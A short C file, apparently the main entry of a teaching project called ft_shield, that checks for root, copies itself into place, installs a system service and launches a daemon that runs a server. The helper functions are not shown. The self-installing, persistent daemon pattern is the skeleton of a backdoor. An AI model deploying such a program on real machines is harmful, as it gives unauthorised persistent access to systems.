#include "ft_shield.h"

int	run_daemon(void)
{
	if (daemonize() != 0)
		return (0);
	if (acquire_lock() != 0)
		return (0);
	setup_signals();
	write_pidfile();
	return (run_server());
}

int	main(void)
{
  if (geteuid() != 0)
    return (0);
	print_login();
	if (is_installed())
		return (run_daemon());
	if (install_self() != 0)
		return (0);
	if (install_service() != 0)
		return (0);
	spawn_daemon();
	return (0);
}

